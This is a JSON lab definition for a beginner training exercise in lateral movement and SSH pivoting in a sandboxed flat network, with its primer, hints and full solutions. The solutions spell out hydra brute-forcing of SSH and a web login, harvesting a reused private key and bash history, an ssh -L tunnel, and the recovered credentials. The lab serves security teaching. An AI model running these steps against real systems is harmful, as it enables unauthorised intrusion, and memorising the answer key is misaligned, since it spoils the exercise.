{
  "title": "CR-18 / Module 5 / N5a — Beginner Lateral Movement & Network Pivoting",
  "description": "Break into a workstation over SSH, harvest a reused private key, and pivot through it to brute-force a maintenance panel that only trusts the internal network.",
  "prerequisites": [
    "Comfort using a Linux shell and an SSH client",
    "Familiarity with dictionary/brute-force attacks using hydra",
    "Basic understanding of TCP port forwarding and tunnelling",
    "CR-18 Modules 2-4 (enumeration, protocol and service-level attacks), or equivalent hands-on experience"
  ],
  "outcomes": [
    "Demonstrate how a single compromised workstation enables internal reconnaissance",
    "Pivot through a compromised host to bypass network segmentation controls",
    "Exploit LAN-only services that are not externally accessible",
    "Understand the risks associated with flat network architectures",
    "Relate pivoting techniques to real-world lateral movement and post-exploitation tactics"
  ],
  "state": "UNRELEASED",
  "levels": [
    {
      "title": "Introduction level",
      "level_type": "INFO_LEVEL",
      "order": 0,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "content": "Welcome to **N5a — Beginner Lateral Movement & Network Pivoting**.\n\nYou're testing a flat, badly segmented network. The client wants to know how far an attacker can move from one compromised workstation. Your job is to find out and be able to show the path.\n\nFrom your assessment box: map the subnet, crack a weak SSH login, pull reusable creds and keys, then pivot through that workstation to reach an internal server and a maintenance panel that only accepts LAN traffic.\n\nYou already have everything you need: `nmap`, `arp-scan`, `hydra`, `curl`, `ssh`, and wordlists in your home folder and on the Desktop.\n\nThe finding isn't just access — it's the chain: one weak password, one reused key, and a flat network that lets you walk from a desktop to a \"protected\" server."
    },
    {
      "title": "Get Access",
      "level_type": "ACCESS_LEVEL",
      "order": 1,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "passkey": "start",
      "cloud_content": "In the topology panel on the right, right-click **vma** and select **Open Console**. Log in with username **user** and password **Password123**. \n\n\nOnce you're connected, submit the passkey **start** to unlock the next level.",
      "local_content": "This sandbox has not been validated for local-only deployment."
    },
    {
      "title": "Background",
      "level_type": "INFO_LEVEL",
      "order": 2,
      "estimated_duration": 8,
      "minimal_possible_solve_time": null,
      "content": "# Pivoting and SSH port forwarding\n\nYou've handled recon and initial access in earlier modules. This challenge is about what you do *after* the first box falls: turning one foothold into reach you didn't have before. A short primer before you start.\n\n## Lateral movement vs pivoting\n\n**Lateral movement** is using access on one host to gain access on another — most often by reusing credentials or keys you find lying around. **Pivoting** is the network trick underneath it: routing your traffic *through* a machine you already control so you can reach hosts and ports your own machine cannot touch directly.\n\nOn a flat network the two blur together, but keep the distinction in mind. Reusing a key to log into the server is lateral movement; tunnelling through the workstation to reach a service that only trusts the workstation is pivoting.\n\n## Why you need a pivot here\n\nThe maintenance panel on the internal server only answers the workstation. Connect to it straight from your assessment machine and you get nothing. But you own the workstation — if you can borrow its position on the network, the panel will talk to you as if you were it.\n\nThat is exactly what SSH local port forwarding does.\n\n## SSH local port forwarding (-L)\n\nThe `-L` flag tells SSH: *open a port on my machine, and forward anything that hits it through the SSH connection and out the far end to a destination of my choosing.*\n\n    ssh -fN -L 8080:<server-ip>:8080 <user>@<workstation-ip>\n\nRead it from the far end back:\n\n- `<user>@<workstation-ip>` — log into the workstation you already cracked.\n- `<server-ip>:8080` — the far-end destination, resolved *from the workstation's point of view*, so the packet leaves the workstation and reaches the server the panel trusts.\n- `8080:` — the local port opened on your assessment machine.\n- `-f` backgrounds SSH after login; `-N` says \"don't run a command, just hold the tunnel open.\"\n\nAfter that, `http://localhost:8080` on your machine is really the panel on the server, arriving from the workstation's address. Your web tools now work against it as if it were local.\n\nList the tunnel with `ps aux | grep ssh` and tear it down with `kill <PID>` (or `pkill -f 8080`) when you're done.\n\n## Credential and key reuse\n\nThe reason the pivot is reachable at all is reuse. Admins clone images, copy SSH keys between machines, and reuse passwords across hosts. A private key sitting in `~/.ssh` on the workstation is often trusted by *other* boxes too — find it, and you may log straight into the next host without cracking anything. Command history (`~/.bash_history`) frequently hands you the account names and hosts to aim at.\n\nThat is the whole chain in this challenge: crack one SSH login, harvest a reused key and a server account name, pivot through the workstation, and brute-force the panel behind it."
    },
    {
      "title": "Establish a Foothold",
      "level_type": "TRAINING_LEVEL",
      "order": 3,
      "estimated_duration": 20,
      "minimal_possible_solve_time": 10,
      "answer": null,
      "answer_variable_name": "ssh_flag",
      "content": "Your testing machine sits on the client's flat LAN, **192.168.0.0/24**. Scope is the local subnet: find what's running, and get into the workstation flagged for weak SSH.\n\nIgnore all other networks; they are system‑related and fall outside the scope of this lab.\n\nYour objectives:\n\n* Enumerate live hosts on the subnet. (192.168.0.1 is the sandbox gateway — out of scope, skip it)\n* Confirm SSH is exposed on the workstation.\n* Brute-force it with common usernames/passwords. (users.txt and passwords.txt are staged in your home directory and on the Desktop)\n* Once in, enumerate like an attacker — keys, configs, and command history are what let you move further.\n\n\nSubmit the **ssh_flag**, which the account left sitting beside its SSH keys.\n\n**Also note a valid server account name while you're in there — you'll need it to pivot to the internal server next stage.**",
      "solution": "* Find your subnet — `ip a` → confirms 192.168.0.0/24.\n* Discover hosts — `nmap -sn 192.168.0.0/24` → finds 192.168.0.2 and 192.168.0.10 (arp-scan -l works too).\n* Scan the service — `nmap -p 22 192.168.0.10` → SSH open.\n* Brute-force SSH — `hydra -L users.txt -P passwords.txt ssh://192.168.0.10 -t 4` → jdoe/letmein123.\n* Log in — `ssh jdoe@192.168.0.10`.\n* Harvest the key — `ls -la ~/.ssh` shows the private key and a `flag.txt` next to it. `cat ~/.ssh/flag.txt` → the ssh_flag; keep `id_rsa` for the next level.\n* Read the history — `cat ~/.bash_history` → reveals admin@192.168.0.2.\n\nFindings:\n* Host A 192.168.0.2 (server)\n* Host B 192.168.0.10 (workstation)\n* login jdoe\n* password letmein123\n* **ssh_flag: ${ANSWER}**\n* **server user: admin**",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Try the Weak Locks",
          "content": "If SSH is exposed on a workstation, test for common usernames and weak passwords with a wordlist-based approach. The dictionaries (users.txt, passwords.txt) are in your home directory and on your Desktop.\n\nUseful tool: hydra.",
          "hint_penalty": 11,
          "order": 1
        },
        {
          "title": "See What's Alive",
          "content": "You are inside a flat LAN. Before attacking any services, work out which hosts are alive in your subnet and what they expose.\n\nUseful tool: nmap (or arp-scan).",
          "hint_penalty": 6,
          "order": 0
        },
        {
          "title": "Loot the Host",
          "content": "After gaining access, check for authentication artifacts — SSH keys, configuration files, command history. These are what let you move further inside the network.\n\n\nSomeone got sloppy — there’s a private key lying around, and it is not the only thing in that directory. `ls -la ~/.ssh`\nYou will also need an admin account - check `bash_history`",
          "hint_penalty": 26,
          "order": 2
        }
      ],
      "incorrect_answer_limit": 5,
      "attachments": [],
      "max_score": 100,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0007.T1016"
        },
        {
          "technique_key": "TA0007.T1018"
        },
        {
          "technique_key": "TA0001.T1078"
        },
        {
          "technique_key": "TA0007.T1046"
        },
        {
          "technique_key": "TA0006.T1552"
        },
        {
          "technique_key": "TA0006.T1110"
        }
      ],
      "expected_commands": [
        "hydra",
        "ssh",
        "nmap"
      ],
      "commands_required": false
    },
    {
      "title": "Demonstrate Internal Impact",
      "level_type": "TRAINING_LEVEL",
      "order": 4,
      "estimated_duration": 30,
      "minimal_possible_solve_time": 15,
      "answer": null,
      "answer_variable_name": "panel_flag",
      "content": "The workstation isn't the goal — it's your pivot. The key and creds you pulled from it show how reuse reaches deeper into the network.\n\nYou need the server account name to get in. If you did not pick it up from the workstation's command history last level, it is still sitting there.\n\nYour objectives:\n\n* Reuse the workstation's private key to log into the internal server (192.168.0.2) and read the admin's message in their home directory — it names the maintenance panel's location and account. Note the service account username.\n* The panel only accepts connections from the workstation, not from you directly. Tunnel through the workstation to bring it within reach. (backgrounded tunnel: list with ps aux | grep ssh, stop with kill <PID>)\n* Brute-force the panel's login through your pivot and capture the flag. (use the staged wordlist.txt)\n\n\nSubmit the Maintenance flag behind the panel.",
      "solution": "* Reuse the key — from the workstation: `ssh -i ~/.ssh/id_rsa admin@192.168.0.2` → shell on the server. jdoe's private key is trusted by the admin account, so no password is needed.\n* Read the admin message — `cat /home/admin/message.txt` → names the maintenance panel on 192.168.0.2:8080 and the `maintenance` service account.\n* Build the pivot — from vma: `ssh -fN -L 8080:192.168.0.2:8080 jdoe@192.168.0.10` → it prompts for jdoe's SSH password, then backgrounds, tunnelling the LAN-only panel to your own port 8080.\n* Verify the tunnel — `curl http://localhost:8080/login` → returns the HTML login form. Note the `method=\"POST\"` and the username/password field names; these are your brute-force parameters.\n* Brute-force the panel — `hydra -l maintenance -P wordlist.txt -s 8080 localhost http-post-form \"/login:username=^USER^&password=^PASS^:Unauthorized\" -t 8` → maintenance/admin123.\n* Capture the flag — with the tunnel still up, authenticate with the recovered creds:\n`curl -s -X POST -d \"username=maintenance&password=admin123\" http://localhost:8080/login` → Access granted; the panel returns the maintenance flag.\n\nMaintenance flag: ${ANSWER}\n\n*Note: stop the background tunnel with `pkill -f 8080:192.168.0.2` when you're done.*",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Attack the Exposed Panel",
          "content": "With the tunnel up the panel answers on your own machine, so an ordinary web form brute-force works against it.\n\nhydra’s `http-post-form` module takes three colon-separated parts: the path it posts to, the body with `^USER^` and `^PASS^` standing in for the credentials, and a string that appears only in a failed response. Read one failed reply from the panel and you will see which string that is. The username was in the note you already recovered.\n\nAfter you harvest the password, use it to pull the flag.",
          "hint_penalty": 25,
          "order": 1
        },
        {
          "title": "Use Your Stepping Stone",
          "content": "You already control a workstation in the LAN. The panel won’t answer your VM, but it will answer the workstation - so borrow the workstation’s access instead of attacking from where you are.\n\nSSH local port forwarding (`ssh -L`) does this: it binds a port on your machine and carries anything arriving there through the SSH session to an address the far end can reach. `-fN` backgrounds it without running a command. Once it is up, the panel is reachable on your own localhost.",
          "hint_penalty": 18,
          "order": 0
        }
      ],
      "incorrect_answer_limit": 5,
      "attachments": [],
      "max_score": 100,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0001.T1078"
        },
        {
          "technique_key": "TA0006.T1110"
        },
        {
          "technique_key": "TA0008.T1021"
        },
        {
          "technique_key": "TA0011.T1572"
        },
        {
          "technique_key": "TA0011.T1090"
        },
        {
          "technique_key": "TA0006.T1552"
        }
      ],
      "expected_commands": [
        "hydra",
        "curl",
        "ssh"
      ],
      "commands_required": false
    },
    {
      "title": "Lab Completed",
      "level_type": "INFO_LEVEL",
      "order": 5,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "content": "You've reached the end of **N5a — Beginner Lateral Movement & Network Pivoting**. Nice work walking the full chain from a single weak SSH login to the maintenance panel behind the pivot. Head back to the LMS to continue the course."
    }
  ],
  "estimated_duration": 58,
  "variant_sandboxes": false
}
